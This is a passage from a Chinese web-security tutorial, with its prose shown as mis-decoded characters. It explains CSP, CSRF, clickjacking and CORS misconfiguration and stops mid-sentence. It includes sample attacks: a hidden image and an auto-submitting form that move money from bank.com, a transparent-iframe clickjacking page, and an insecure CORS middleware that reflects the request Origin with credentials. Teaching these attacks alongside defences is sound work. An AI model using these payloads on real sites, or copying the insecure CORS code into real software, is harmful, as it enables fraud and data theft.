  <span class="hljs-attr">sameSite</span>: <span class="hljs-string">'strict'</span> <span class="hljs-comment">// è·¨ç«™è¯·æ±‚ä¸å‘é€</span>
});
</code></pre>
<p><strong>5. Content Security Policy (CSP)</strong></p>
<p>CSP æ˜¯æµè§ˆå™¨çº§åˆ«çš„é˜²æŠ¤ï¼Œé€šè¿‡ HTTP å“åº”å¤´é™åˆ¶é¡µé¢èƒ½åŠ è½½å“ªäº›èµ„æºã€‚è®¾ç½®å¥½ CSPï¼Œå³ä½¿æœ‰ XSS æ¼æ´ï¼Œæ”»å‡»è€…ä¹Ÿå¾ˆéš¾åˆ©ç”¨ã€‚</p>
<p>é€šè¿‡ HTTP å“åº”å¤´è®¾ç½®ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-attribute">Content</span>-Security-Policy: default-src <span class="hljs-string">'self'</span>; script-<span class="hljs-attribute">src</span> 'self' 'nonce-abc123'; style-<span class="hljs-attribute">src</span> 'self' 'unsafe-inline'; <span class="hljs-selector-tag">img</span>-<span class="hljs-attribute">src</span> *; <span class="hljs-selector-tag">object</span>-<span class="hljs-attribute">src</span> '<span class="hljs-attribute">none</span>'
</code></pre>
<p>æˆ–è€…ç”¨ meta æ ‡ç­¾ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"Content-Security-Policy"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"default-src 'self'; script-src 'self' https://trusted.com"</span>&gt;</span>
</code></pre>
<p>è¿™ä¸ªç­–ç•¥çš„æ„æ€æ˜¯ï¼š</p>
<ul>
<li><code>default-src 'self'</code>ï¼šé»˜è®¤åªèƒ½åŠ è½½åŒæºèµ„æº</li>
<li><code>script-src 'self' 'nonce-abc123'</code>ï¼šè„šæœ¬åªèƒ½æ¥è‡ªåŒæºæˆ–å¸¦æœ‰ç‰¹å®š nonce çš„å†…è”è„šæœ¬</li>
<li><code>object-src 'none'</code>ï¼šç¦æ­¢ <code>&lt;object&gt;</code>ã€<code>&lt;embed&gt;</code> æ ‡ç­¾</li>
</ul>
<p><strong>CSP æŒ‡ä»¤è¯¦è§£</strong></p>
<pre><code class="hljs language-perl" lang="perl">Content-Security-Policy:
  default-src <span class="hljs-string">'none'</span>;                                 <span class="hljs-comment"># é»˜è®¤ç¦æ­¢æ‰€æœ‰</span>
  script-src <span class="hljs-string">'self'</span> <span class="hljs-string">'nonce-randomvalue'</span> https:<span class="hljs-regexp">//</span>cdn.example.com;  <span class="hljs-comment"># è„šæœ¬æ¥æº</span>
  style-src <span class="hljs-string">'self'</span> <span class="hljs-string">'nonce-randomvalue'</span>;               <span class="hljs-comment"># æ ·å¼æ¥æº</span>
  img-src <span class="hljs-string">'self'</span> data: https:;                        <span class="hljs-comment"># å›¾ç‰‡æ¥æº</span>
  font-src <span class="hljs-string">'self'</span> https:<span class="hljs-regexp">//</span>fonts.gstatic.com;          <span class="hljs-comment"># å­—ä½“æ¥æº</span>
  <span class="hljs-keyword">connect</span>-src <span class="hljs-string">'self'</span>;                                 <span class="hljs-comment"># Ajax/WebSocket è¿æ¥</span>
  frame-ancestors <span class="hljs-string">'none'</span>;                             <span class="hljs-comment"># é˜²æ­¢è¢«åµŒå…¥ iframe</span>
  base-uri <span class="hljs-string">'self'</span>;                                    <span class="hljs-comment"># é™åˆ¶ &lt;base&gt; æ ‡ç­¾</span>
  form-action <span class="hljs-string">'self'</span>;                                 <span class="hljs-comment"># è¡¨å•æäº¤åœ°å€</span>
</code></pre>
<p>å…³é”®ç‚¹ï¼š</p>
<ul>
<li>é¿å…ä½¿ç”¨ <code>'unsafe-inline'</code> å’Œ <code>'unsafe-eval'</code>ï¼Œå®ƒä»¬ä¼šå‰Šå¼± CSP ä¿æŠ¤</li>
<li>ç”¨ <code>nonce</code> æˆ– <code>hash</code> ä»£æ›¿ <code>unsafe-inline</code></li>
<li><code>frame-ancestors</code> é˜²æ­¢ç‚¹å‡»åŠ«æŒ</li>
<li>é…ç½® <code>report-uri</code> æ”¶é›†è¿è§„æŠ¥å‘Š</li>
</ul>
<p><strong>nonce çš„æ­£ç¡®ç”¨æ³•</strong></p>
<p>æœåŠ¡å™¨ä¸ºæ¯ä¸ªè¯·æ±‚ç”Ÿæˆéšæœº nonceï¼Œå†…è”è„šæœ¬å¿…é¡»åŒ¹é…ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- æœåŠ¡å™¨æ¯æ¬¡è¯·æ±‚ç”Ÿæˆæ–°çš„ nonce --&gt;</span>
<span class="hljs-comment">&lt;!-- å“åº”å¤´ --&gt;</span>
Content-Security-Policy: script-src 'nonce-abc123'

<span class="hljs-comment">&lt;!-- HTML --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">"abc123"</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Allowed'</span>);  <span class="hljs-comment">// è¿™ä¸ªè„šæœ¬å¯ä»¥æ‰§è¡Œ</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Blocked'</span>);  <span class="hljs-comment">// æ”»å‡»è€…æ³¨å…¥çš„è„šæœ¬ï¼Œæ²¡æœ‰ nonceï¼Œè¢«æ‹¦æˆª</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>åç«¯ç”Ÿæˆ nonce çš„ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Express ä¸­é—´ä»¶</span>
<span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">'crypto'</span>);

app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {
  <span class="hljs-comment">// æ¯æ¬¡è¯·æ±‚ç”Ÿæˆæ–°çš„ nonce</span>
  res.<span class="hljs-property">locals</span>.<span class="hljs-property">nonce</span> = crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">'base64'</span>);
  res.<span class="hljs-title function_">setHeader</span>(
    <span class="hljs-string">'Content-Security-Policy'</span>,
    <span class="hljs-string">`script-src 'nonce-<span class="hljs-subst">${res.locals.nonce}</span>'`</span>
  );
  <span class="hljs-title function_">next</span>();
});
</code></pre>
<p><strong>Report-Only æ¨¡å¼</strong></p>
<p>å…ˆç”¨ <code>Content-Security-Policy-Report-Only</code> æµ‹è¯•ï¼Œä¸ä¼šçœŸçš„é˜»æ­¢èµ„æºï¼Œåªæ˜¯ä¸ŠæŠ¥è¿è§„ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-attribute">Content</span>-Security-Policy-Report-Only: default-src <span class="hljs-string">'self'</span>; report-uri /csp-report
</code></pre>
<p>çœ‹çœ‹æœ‰å“ªäº›èµ„æºè¿è§„ï¼Œè°ƒæ•´ç­–ç•¥åå†æ­£å¼å¯ç”¨ã€‚</p>
<hr/>
<h2 data-id="heading-3">CSRFï¼šå€Ÿåˆ€æ€äºº</h2>
<p>CSRFï¼ˆCross-Site Request Forgeryï¼Œè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰çš„åŸç†æ˜¯ï¼šç”¨æˆ·ç™»å½•äº† A ç½‘ç«™ï¼ŒCookie é‡Œæœ‰ä¼šè¯ä¿¡æ¯ã€‚ç”¨æˆ·è®¿é—®æ¶æ„ç½‘ç«™ Bï¼ŒB ç½‘ç«™å‘ A å‘è¯·æ±‚ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å¸¦ä¸Š A çš„ Cookieï¼ŒA ç½‘ç«™ä»¥ä¸ºæ˜¯ç”¨æˆ·æœ¬äººçš„æ“ä½œã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant ç”¨æˆ·
    participant é“¶è¡Œç½‘ç«™
    participant æ¶æ„ç½‘ç«™

    ç”¨æˆ·-&gt;&gt;é“¶è¡Œç½‘ç«™: 1. ç™»å½•é“¶è¡Œç½‘ç«™
    é“¶è¡Œç½‘ç«™-&gt;&gt;ç”¨æˆ·: 2. è¿”å›ä¼šè¯Cookie
    ç”¨æˆ·-&gt;&gt;æ¶æ„ç½‘ç«™: 3. è®¿é—®æ¶æ„ç½‘ç«™
    æ¶æ„ç½‘ç«™-&gt;&gt;ç”¨æˆ·: 4. é¡µé¢åŒ…å«éšè—è¯·æ±‚
    ç”¨æˆ·-&gt;&gt;é“¶è¡Œç½‘ç«™: 5. æµè§ˆå™¨è‡ªåŠ¨å‘é€è¯·æ±‚(å¸¦Cookie)
    é“¶è¡Œç½‘ç«™-&gt;&gt;é“¶è¡Œç½‘ç«™: 6. éªŒè¯Cookieæœ‰æ•ˆï¼Œæ‰§è¡Œè½¬è´¦
    Note over ç”¨æˆ·: ç”¨æˆ·å®Œå…¨ä¸çŸ¥æƒ…
</code></pre>
<h3 data-id="heading-4">æ”»å‡»ç¤ºä¾‹</h3>
<p>ç”¨æˆ·ç™»å½•äº†é“¶è¡Œç½‘ç«™ <code>bank.com</code>ï¼ŒCookie è¿˜æœ‰æ•ˆã€‚è¿™æ—¶å€™è®¿é—®äº†æ¶æ„ç½‘ç«™ <code>evil.com</code>ï¼Œæ¶æ„ç½‘ç«™é‡Œæœ‰è¿™æ ·ä¸€æ®µä»£ç ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- æ–¹å¼1ï¼šéšè—å›¾ç‰‡ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://bank.com/transfer?to=attacker&amp;amount=1000"</span>&gt;</span>

<span class="hljs-comment">&lt;!-- æ–¹å¼2ï¼šè‡ªåŠ¨æäº¤è¡¨å• --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"https://bank.com/transfer"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"POST"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"evilForm"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"to"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"attacker"</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"amount"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"10000"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'evilForm'</span>).<span class="hljs-title function_">submit</span>();</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>æµè§ˆå™¨ä¼šè‡ªåŠ¨å¸¦ä¸Š <code>bank.com</code> çš„ Cookie å‘è¯·æ±‚ï¼Œé’±å°±è½¬èµ°äº†ã€‚ç”¨æˆ·å®Œå…¨ä¸çŸ¥æƒ…ã€‚</p>
<h3 data-id="heading-5">é˜²å¾¡ CSRF çš„å®Œæ•´æ–¹æ¡ˆ</h3>
<p><strong>1. CSRF Tokenï¼ˆæœ€å¯é ï¼‰</strong></p>
<p>æœåŠ¡å™¨ç”Ÿæˆä¸€ä¸ªéšæœº tokenï¼Œå­˜åœ¨ session é‡Œï¼ŒåŒæ—¶æ”¾åˆ°é¡µé¢çš„éšè—å­—æ®µæˆ–è¯·æ±‚å¤´ä¸­ã€‚æäº¤æ—¶éªŒè¯ token æ˜¯å¦åŒ¹é…ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å‰ç«¯ä»é¡µé¢è·å– token</span>
<span class="hljs-keyword">const</span> csrfToken = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'meta[name="csrf-token"]'</span>).<span class="hljs-property">content</span>;

<span class="hljs-comment">// æ–¹å¼1ï¼šæ”¾åœ¨è¯·æ±‚å¤´</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/transfer'</span>, {
  <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
  <span class="hljs-attr">headers</span>: {
    <span class="hljs-string">'X-CSRF-Token'</span>: csrfToken,
    <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>
  },
  <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ <span class="hljs-attr">to</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">amount</span>: <span class="hljs-number">100</span> })
});

<span class="hljs-comment">// æ–¹å¼2ï¼šæ”¾åœ¨è¡¨å•éšè—å­—æ®µ</span>
<span class="hljs-comment">// &lt;input type="hidden" name="_csrf" value="token-from-server"&gt;</span>
</code></pre>
<p>åç«¯éªŒè¯ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Express ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> csrf = <span class="hljs-built_in">require</span>(<span class="hljs-string">'csurf'</span>);
<span class="hljs-keyword">const</span> csrfProtection = <span class="hljs-title function_">csrf</span>({ <span class="hljs-attr">cookie</span>: <span class="hljs-literal">true</span> });

app.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/transfer'</span>, csrfProtection, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  <span class="hljs-comment">// token éªŒè¯é€šè¿‡æ‰ä¼šåˆ°è¿™é‡Œ</span>
  <span class="hljs-comment">// æ‰§è¡Œè½¬è´¦é€»è¾‘</span>
});
</code></pre>
<p>æ”»å‡»è€…æ²¡æ³•è·å–è¿™ä¸ª tokenï¼ˆè·¨åŸŸæ‹¿ä¸åˆ°é¡µé¢å†…å®¹ï¼‰ï¼Œä¼ªé€ çš„è¯·æ±‚å°±ä¼šå¤±è´¥ã€‚</p>
<p><strong>2. SameSite Cookieï¼ˆç°ä»£æµè§ˆå™¨é»˜è®¤é˜²æŠ¤ï¼‰</strong></p>
<p>Cookie åŠ ä¸Š <code>SameSite</code> å±æ€§ï¼Œè·¨ç«™è¯·æ±‚å°±ä¸ä¼šå¸¦ Cookieï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åç«¯è®¾ç½®</span>
res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">'sessionId'</span>, <span class="hljs-string">'xxx'</span>, {
  <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">secure</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">sameSite</span>: <span class="hljs-string">'strict'</span>  <span class="hljs-comment">// æˆ–è€… 'lax'</span>
});
</code></pre>
<p>ä¸‰ä¸ªå€¼çš„åŒºåˆ«ï¼š</p>
<ul>
<li><code>Strict</code>ï¼šè·¨ç«™è¯·æ±‚å®Œå…¨ä¸å‘é€ Cookieï¼Œæœ€å®‰å…¨ä½†å¯èƒ½å½±å“ç”¨æˆ·ä½“éªŒï¼ˆä»å¤–éƒ¨é“¾æ¥ç‚¹è¿›æ¥ä¹Ÿæ²¡ Cookieï¼Œéœ€è¦é‡æ–°ç™»å½•ï¼‰</li>
<li><code>Lax</code>ï¼šGET è¯·æ±‚çš„é¡¶çº§å¯¼èˆªå¯ä»¥å‘é€ï¼ˆæ¯”å¦‚ç‚¹é“¾æ¥ï¼‰ï¼ŒPOST ä¸å‘é€ã€‚å¤§å¤šæ•°åœºæ™¯å¤Ÿç”¨ï¼ŒChrome 80 ä¹‹åçš„é»˜è®¤å€¼</li>
<li><code>None</code>ï¼šéƒ½å‘é€ï¼Œä½†å¿…é¡»é…åˆ <code>Secure</code>ï¼ˆä»… HTTPSï¼‰</li>
</ul>
<p>å®é™…æ•ˆæœï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç”¨æˆ·åœ¨ bank.com ç™»å½•ï¼ŒCookie è®¾ç½®ä¸º SameSite=Strict</span>

<span class="hljs-comment">// åœºæ™¯1ï¼šä»å¤–éƒ¨é“¾æ¥ï¼ˆevil.comï¼‰ç‚¹å‡»è·³è½¬åˆ° bank.com</span>
<span class="hljs-comment">// ç»“æœï¼šCookie ä¸ä¼šå‘é€ï¼Œç”¨æˆ·éœ€è¦é‡æ–°ç™»å½•</span>

<span class="hljs-comment">// åœºæ™¯2ï¼ševil.com çš„è„šæœ¬å‘èµ·å¯¹ bank.com çš„è¯·æ±‚</span>
<span class="hljs-comment">// ç»“æœï¼šCookie ä¸ä¼šå‘é€ï¼Œè¯·æ±‚å¤±è´¥</span>

<span class="hljs-comment">// åœºæ™¯3ï¼šbank.com å†…éƒ¨çš„é“¾æ¥è·³è½¬</span>
<span class="hljs-comment">// ç»“æœï¼šCookie æ­£å¸¸å‘é€</span>
</code></pre>
<p>Chrome ä» 2020 å¹´å¼€å§‹ï¼Œæ²¡è®¾ç½® SameSite çš„ Cookie é»˜è®¤å½“ä½œ <code>Lax</code> å¤„ç†ï¼Œå¤§å¤§æå‡äº†å®‰å…¨æ€§ã€‚</p>
<p><strong>3. éªŒè¯ Origin/Referer å¤´</strong></p>
<p>æ£€æŸ¥è¯·æ±‚çš„ <code>Origin</code> æˆ– <code>Referer</code> å¤´ï¼Œæ‹’ç»æ¥è‡ªå…¶ä»–åŸŸçš„è¯·æ±‚ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åç«¯éªŒè¯</span>
<span class="hljs-keyword">const</span> origin = req.<span class="hljs-property">headers</span>.<span class="hljs-property">origin</span> || req.<span class="hljs-property">headers</span>.<span class="hljs-property">referer</span>;

<span class="hljs-keyword">if</span> (!origin || !origin.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'https://yoursite.com'</span>)) {
  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">'Forbidden'</span>);
}
</code></pre>
<p>ä½†è¿™ä¸ªæ–¹æ³•æœ‰å±€é™æ€§ï¼š</p>
<ul>
<li>æŸäº›æƒ…å†µä¸‹è¿™ä¸¤ä¸ªå¤´å¯èƒ½ä¸å­˜åœ¨ï¼ˆéšç§è®¾ç½®ã€ä»£ç†ï¼‰</li>
<li>å¯ä»¥ä½œä¸ºé¢å¤–é˜²æŠ¤å±‚ï¼Œä½†ä¸åº”å•ç‹¬ä¾èµ–</li>
</ul>
<p><strong>4. åŒé‡ Cookie éªŒè¯</strong></p>
<p>å°† token åŒæ—¶å­˜åœ¨ Cookie å’Œè¯·æ±‚å‚æ•°ä¸­ï¼ŒæœåŠ¡å™¨æ¯”å¯¹ä¸¤è€…æ˜¯å¦ä¸€è‡´ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç™»å½•æ—¶è®¾ç½®</span>
res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">'csrf_token'</span>, token);

<span class="hljs-comment">// å‰ç«¯å‘è¯·æ±‚æ—¶ï¼Œä» cookie è¯»å– token å¹¶æ”¾åˆ°è¯·æ±‚å¤´</span>
<span class="hljs-keyword">const</span> token = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">'csrf_token='</span>)[<span class="hljs-number">1</span>];
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/action'</span>, {
  <span class="hljs-attr">headers</span>: { <span class="hljs-string">'X-CSRF-Token'</span>: token }
});

<span class="hljs-comment">// åç«¯éªŒè¯</span>
<span class="hljs-keyword">const</span> cookieToken = req.<span class="hljs-property">cookies</span>.<span class="hljs-property">csrf_token</span>;
<span class="hljs-keyword">const</span> headerToken = req.<span class="hljs-property">headers</span>[<span class="hljs-string">'x-csrf-token'</span>];
<span class="hljs-keyword">if</span> (cookieToken !== headerToken) {
  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">'CSRF token mismatch'</span>);
}
</code></pre>
<p>æ”»å‡»è€…çš„è·¨ç«™è¯·æ±‚è™½ç„¶èƒ½è‡ªåŠ¨å¸¦ä¸Š Cookieï¼Œä½†æ— æ³•è¯»å– Cookie å†…å®¹ï¼Œä¹Ÿå°±æ‹¿ä¸åˆ° token æ”¾åˆ°è¯·æ±‚å¤´é‡Œã€‚</p>
<hr/>
<h2 data-id="heading-6">ç‚¹å‡»åŠ«æŒï¼šéšœçœ¼æ³•</h2>
<p>ç‚¹å‡»åŠ«æŒï¼ˆClickjackingï¼‰æ˜¯æŠŠç›®æ ‡ç½‘ç«™ç”¨é€æ˜ iframe åµŒå…¥åˆ°æ”»å‡»è€…ç½‘ç«™ï¼Œç”¨æˆ·ä»¥ä¸ºåœ¨ç‚¹æ”»å‡»è€…çš„é¡µé¢ï¼Œå®é™…ç‚¹çš„æ˜¯ iframe é‡Œçš„ç›®æ ‡ç½‘ç«™ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    subgraph æ”»å‡»è€…é¡µé¢
        A[å‡æŒ‰é’®: é¢†å–ä¼˜æƒ åˆ¸]
        B[é€æ˜iframe: é“¶è¡Œè½¬è´¦é¡µé¢]
    end

    C[ç”¨æˆ·] --&gt;|ç‚¹å‡»å‡æŒ‰é’®| A
    A -.-&gt;|å®é™…è§¦å‘| B
    B --&gt;|æ‰§è¡Œ| D[é“¶è¡Œè½¬è´¦æ“ä½œ]
</code></pre>
<h3 data-id="heading-7">æ”»å‡»åœºæ™¯</h3>
<p>æ”»å‡»è€…é¡µé¢ä¸Šæ”¾äº†ä¸ª"é¢†å–ä¼˜æƒ åˆ¸"æŒ‰é’®ï¼Œä½†æŒ‰é’®ä¸‹é¢æ˜¯é€æ˜çš„ iframeï¼Œiframe é‡ŒåŠ è½½çš„æ˜¯é“¶è¡Œç½‘ç«™çš„è½¬è´¦ç¡®è®¤æŒ‰é’®ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- æ”»å‡»è€…é¡µé¢ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
  <span class="hljs-selector-tag">iframe</span> {
    <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.01</span>;  <span class="hljs-comment">/* å‡ ä¹é€æ˜ */</span>
    <span class="hljs-attribute">position</span>: absolute;
    <span class="hljs-attribute">top</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">left</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">z-index</span>: <span class="hljs-number">9999</span>;
  }
  <span class="hljs-selector-class">.fake-button</span> {
    <span class="hljs-attribute">position</span>: absolute;
    <span class="hljs-attribute">top</span>: <span class="hljs-number">100px</span>;
    <span class="hljs-attribute">left</span>: <span class="hljs-number">100px</span>;
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://bank.com/transfer"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"fake-button"</span>&gt;</span>é¢†å–ä¼˜æƒ åˆ¸<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
</code></pre>
<p>ç”¨æˆ·ç‚¹"é¢†å–ä¼˜æƒ åˆ¸"ï¼Œå®é™…è§¦å‘äº† iframe é‡Œé“¶è¡Œç½‘ç«™çš„è½¬è´¦ç¡®è®¤æŒ‰é’®ã€‚</p>
<h3 data-id="heading-8">é˜²æŠ¤æ‰‹æ®µ</h3>
<p><strong>1. X-Frame-Options å¤´</strong></p>
<p>æœ€ç®€å•æœ‰æ•ˆçš„æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">X-Frame-Options:</span> <span class="hljs-string">DENY</span>        <span class="hljs-comment"># å®Œå…¨ç¦æ­¢è¢« iframe åµŒå…¥</span>
<span class="hljs-attr">X-Frame-Options:</span> <span class="hljs-string">SAMEORIGIN</span>  <span class="hljs-comment"># åªå…è®¸åŒæºåµŒå…¥</span>
</code></pre>
<p>Nginx é…ç½®ï¼š</p>
<pre><code class="hljs language-nginx" lang="nginx">add_header X-Frame-Options "SAMEORIGIN" always;
</code></pre>
<p><strong>2. CSP frame-ancestorsï¼ˆæ¨èï¼‰</strong></p>
<p>æ›´ç°ä»£çš„æ–¹æ¡ˆï¼ŒåŠŸèƒ½æ›´å¼ºå¤§ï¼š</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-attribute">Content-Security-Policy</span>: frame-ancestors <span class="hljs-string">'self'</span> <span class="hljs-attribute">https</span>:<span class="hljs-comment">//trusted.com</span>
</code></pre>
<p>å¯ä»¥æŒ‡å®šå¤šä¸ªå…è®¸çš„åŸŸåï¼Œæ¯” X-Frame-Options çµæ´»ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åªå…è®¸åŒæº</span>
Content-Security-Policy: frame-ancestors <span class="hljs-string">'self'</span>

<span class="hljs-comment"># å…è®¸å¤šä¸ªä¿¡ä»»åŸŸå</span>
Content-Security-Policy: frame-ancestors <span class="hljs-string">'self'</span> https://trusted1.com https://trusted2.com

<span class="hljs-comment"># å®Œå…¨ç¦æ­¢</span>
Content-Security-Policy: frame-ancestors <span class="hljs-string">'none'</span>
</code></pre>
<p><strong>3. SameSite Cookie</strong></p>
<p>å³ä½¿é¡µé¢è¢«åµŒå…¥ iframeï¼Œè®¾ç½®äº† <code>SameSite=Strict</code> æˆ– <code>SameSite=Lax</code> çš„ Cookie ä¸ä¼šå‘é€ï¼Œç”¨æˆ·åœ¨ iframe é‡Œç›¸å½“äºæœªç™»å½•çŠ¶æ€ï¼Œæ— æ³•å®Œæˆæ•æ„Ÿæ“ä½œã€‚</p>
<p><strong>4. å‰ç«¯æ£€æµ‹</strong></p>
<p>JavaScript æ£€æµ‹é¡µé¢æ˜¯å¦è¢«åµŒå…¥ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>.<span class="hljs-property">top</span> !== <span class="hljs-variable language_">window</span>.<span class="hljs-property">self</span>) {
  <span class="hljs-comment">// é¡µé¢è¢«åµŒå…¥ iframe</span>
  <span class="hljs-comment">// å¯ä»¥è·³å‡º iframe æˆ–æ˜¾ç¤ºè­¦å‘Š</span>
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">top</span>.<span class="hljs-property">location</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">self</span>.<span class="hljs-property">location</span>;
}
</code></pre>
<p>ä½†è¿™ä¸ªæ–¹æ³•ä¸å¤ªå¯é ï¼Œæ”»å‡»è€…å¯ä»¥ç”¨ <code>sandbox</code> å±æ€§ç¦ç”¨è„šæœ¬ã€‚å»ºè®®ä½œä¸ºè¾…åŠ©æ‰‹æ®µï¼Œä¸»è¦è¿˜æ˜¯é  HTTP å¤´ã€‚</p>
<p>è¿™ä¸‰ä¸ªæ‰‹æ®µå»ºè®®åŒæ—¶ä½¿ç”¨ï¼Œå½¢æˆçºµæ·±é˜²å¾¡ã€‚</p>
<hr/>
<h2 data-id="heading-9">CORS é…ç½®é”™è¯¯ï¼šå¼€é”™äº†é—¨</h2>
<p>CORSï¼ˆè·¨åŸŸèµ„æºå…±äº«ï¼‰æœ¬èº«æ˜¯å®‰å…¨æœºåˆ¶ï¼Œä½†é…ç½®ä¸å½“åè€Œä¼šé€ æˆæ¼æ´ã€‚</p>
<h3 data-id="heading-10">å±é™©é…ç½®ç¤ºä¾‹</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åç«¯ä»£ç  - å±é™©ç¤ºä¾‹</span>
app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {
  <span class="hljs-comment">// æŠŠè¯·æ±‚çš„ Origin ç›´æ¥åå°„å›å»ï¼Œå¤ªå±é™©äº†</span>
  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Origin'</span>, req.<span class="hljs-property">headers</span>.<span class="hljs-property">origin</span>);
  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Credentials'</span>, <span class="hljs-string">'true'</span>);
  <span class="hljs-title function_">next</span>();
});
</code></pre>
<p>è¿™æ ·é…ç½®ç­‰äºå¯¹æ‰€æœ‰ç½‘ç«™æ•å¼€å¤§é—¨ã€‚æ”»å‡»è€…ç½‘ç«™å¯ä»¥å‘è¯·æ±‚è·å–ç”¨æˆ·æ•°æ®ï¼š</p>
